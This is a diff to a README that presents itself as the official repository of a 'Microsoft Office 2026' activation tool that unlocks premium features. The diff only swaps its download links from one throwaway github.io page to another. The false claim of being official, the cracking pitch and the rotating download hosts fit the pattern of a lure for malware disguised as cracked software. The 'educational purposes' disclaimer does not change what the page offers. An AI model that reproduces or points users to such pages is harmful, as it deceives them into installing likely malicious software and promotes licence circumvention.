@@ -2,7 +2,7 @@
 
 Welcome to the official repository for the Microsoft Office 2026 Productivity Suite. This tool provides a streamlined and efficient way to manage and activate your Office installation, ensuring you have access to the full suite of Word, Excel, PowerPoint, and Outlook applications with all premium features unlocked for the 2026 release cycle.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## 🚀 Key Features
 
@@ -51,7 +51,7 @@ A: Absolutely. The tool fully supports the latest Microsoft Office 2024 Retail a
 
 For the safest and most up-to-date version of the installer, please use our official download page. We do not host the file on any other platform to ensure its integrity.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 *Disclaimer: This tool is provided for educational and utility purposes. Users are responsible for ensuring they comply with Microsoft's licensing terms. Last updated: 2026.*
